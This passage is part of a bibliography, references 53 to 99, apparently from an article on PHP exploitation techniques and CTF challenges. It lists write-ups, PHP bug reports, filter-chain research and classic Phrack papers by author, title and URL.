[53] "Codegate CTF Preliminary 2015 / Owlur", https://ctftime.org/task/1398

[54] Orange Tsai, "HITCON CTF 2018 - One Line PHP Challenge"
 https://blog.orange.tw/posts2018-10-hitcon-ctf-2018-
 one-line-php-challenge/

[55] Taoguang "Ryat" Chen, "PHP Session Data Injection Vulnerability"
 https://bugs.php.net/bug.php?id=72681

[56] Yuhang "wupco" Wu, "One Line PHP Challenge without session.upload"
 https://hackmd.io/@ZzDmROodQUynQsF9je3Q5Q/rJlfZva0m?type=view

[57] Bruno "0xbb" Bierbaumer, "hxp 36C3 CTF / includer"
 https://ctftime.org/task/10249

[58] waderwu (@yxxx), "0CTF 2021 / 1linephp"
 https://github.com/waderwu/My-CTF-Challenges/blob/master/0ctf-2021/
 1linephp/writeup/1linephp_writeup_en.md

[59] Kaibro, "Balsn CTF 2021 / 2linephp"
 https://github.com/w181496/My-CTF-Challenges/tree/master/
 Balsn-CTF-2021#2linephp

[60] Bruno "0xbb" Bierbaumer, "hxp CTF 2021: includer's revenge writeup"
 https://hxp.io/blog/90/hxp-CTF-2021-includers-revenge-writeup/

[61] Ginoah, Bookgin, "One Line PHP: From Genesis to Ragnarök"
 https://hackmd.io/@ginoah/phpInclude

[62] @loknop, "Solving includer's revenge from hxp ctf 2021 without
 controlling any files", https://gist.github.com/loknop/
 b27422d355ea1fd0d90d6dbc1e278d4d

[63] Gynvael Coldwind, "Surprising CTF task solution using php://filter"
 https://gynvael.coldwind.pl/?lang=en&id=671

[64] Yuhang "wupco" Wu, "PHP_INCLUDE_TO_SHELL_CHAR_DICT"
 https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT

[65] Rémi "Remsio" Matasse, "PHP filters chain: What is it and how to use
 it", https://www.synacktiv.com/en/publications/php-filters-chain-
 what-is-it-and-how-to-use-it

[66] @hashkitten, "DownUnderCTF 2021 / minimal-php"
 https://github.com/DownUnderCTF/Challenges_2022_Public/blob/main/web/
 minimal-php/solve/solution.py

[67] Rémi "Remsio" Matasse, "PHP filter chains: file read from error-based
 oracle", https://www.synacktiv.com/publications/php-filter-chains-
 file-read-from-error-based-oracle

[68] Charles "cfreal" Fol, "Introducing wrapwrap: using PHP filters to
 wrap a file with a prefix and suffix", https://blog.lexfo.fr/
 wrapwrap-php-filters-suffix.html

[69] Charles "cfreal" Fol, "Introducing lightyear, a new way to dump PHP
 files", https://blog.lexfo.fr/lightyear-file-dump.html

[70] Charles "cfreal" Fol, "Iconv, set the charset to RCE: Exploiting the
 glibc to hack the PHP engine", https://blog.lexfo.fr/iconv-
 cve-2024-2961-p1.html

[71] "Limit maximum number of filter chains as a security measure"
 https://github.com/php/php-src/issues/10453

[72] Orange Tsai, "HITCON CTF 2017 / Baby^H Master PHP 2017
 https://github.com/orangetw/My-CTF-Web-Challenges#
 babyh-master-php-2017

[73] "HITCON2017-writeup整理", https://lorexxar.cn/2017/11/10/hitcon2017-
 writeup/#/baby-h-master-php-2017

[74] Sam Thomas, "It's a PHP Unserialization Vulnerability Jim, but Not as
 We Know It", https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-
 Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf

[75] "Чтение файлов => unserialize !", https://rdot.org/forum/
 showthread.php?t=4379 (archived)

[76] Anton (@ByQwert), "Insecure PHP deserialization through phar://
 wrapper.", https://github.com/mpdf/mpdf/issues/949

[77] Cyku, "phar:// deserialization and weak randomness of temporary file
 name may lead to RCE", https://github.com/mpdf/mpdf/issues/1381

[78] "PHP RFC: Don't automatically unserialize Phar metadata outside
 getMetadata()", https://wiki.php.net/rfc/
 phar_stop_autoloading_metadata

[79] Martin "sisu" Radev, "Statement on 'HXP CTF Chrome 0day bug'"
 http://varko.xyz/shadertoy_plus_plus_chrome_0day_sisu_statement.html

[80] @A2nkF, @localo, "Escaping VirtualBox 6.1"
 https://secret.club/2021/01/14/vbox-escape.html

[81] Jonathan "j0nathanj" Jacobi, VoidMercy
 "CS:GO RCE 0-day - Real World CTF Qualifiers 2018"
 https://blog.perfect.blue/P90_Rush_B

[82] "Eindbazen PHP-CGI advisory (CVE-2012-1823)", http://eindbazen.net/
 2012/05/php-cgi-advisory-cve-2012-1823/ (archived)

[83] Emil "neex" Lerner, "PHuiP-FPizdaM"
 https://github.com/neex/phuip-fpizdam

[84] Michel "MaXX" Kaempf
 "Vudo - An object superstitiously believed to embody magical powers"
 https://phrack.org/issues/57/8

[85] Aleph One, "Smashing The Stack For Fun And Profit"
 https://phrack.org/issues/49/14

[86] "PHP Security Advent Calendar 2017"
 https://www.ripstech.com/php-security-calendar-2017/ (archived)

[87] Taoguang "Ryat" Chen, "GMP Deserialization Type Confusion
 Vulnerability [MyBB <= 1.8.3 RCE Vulnerability]"
 https://seclists.org/fulldisclosure/2017/Jan/55

[88] Stefan Esser, "phpinfo() Type Confusion Infoleak Vulnerability and
 SSL Private Keys", https://sektioneins.de/blog/
 14-07-04-phpinfo-infoleak.html

[89] Stefan Schiller, "Joomla: PHP Bug Introduces Multiple XSS
 Vulnerabilities", https://www.sonarsource.com/blog/
 joomla-multiple-xss-vulnerabilities/

[90] Charles "cfreal" Fol, "mysqlnd/pdo password buffer overflow leading
 to RCE", https://bugs.php.net/bug.php?id=81719

[91] LoRexxar, Dawu, "Mysql Client Arbitrary File Reading Attack Chain
 Extension", https://medium.com/@knownsec404team/mysql-client-
 arbitrary-file-reading-attack-chain-extension-727bb63f578c

[92] Blaklis, "InsomniHack Finals 2019 / Phuck3"
 https://github.com/Blaklis/my-challenges/tree/master/phuck3

[93] "Command execution through imap_open"
 https://bugs.php.net/bug.php?id=76428

[94] "LiveCTF", https://livectf.com/

[95] "Binary Golf", https://binary.golf/

[96] "Super Mario World Credits Warp Explained"
 https://www.youtube.com/watch?v=vAHXK2wut_I

[97] TheXcellerator
 "Tetsuji: Remote Code Execution on a GameBoy Colour 22 Years Later"
 https://xcellerator.github.io/posts/tetsuji/

[98] @murachu, "目grep入門 +解説"
 https://www.slideshare.net/slideshow/grep-8132856/8132856

[99] Jordan "psifertex" Wiens, "A Brief History of CTF"
 https://psifertex.github.io/a-brief-history-of-ctf/
```
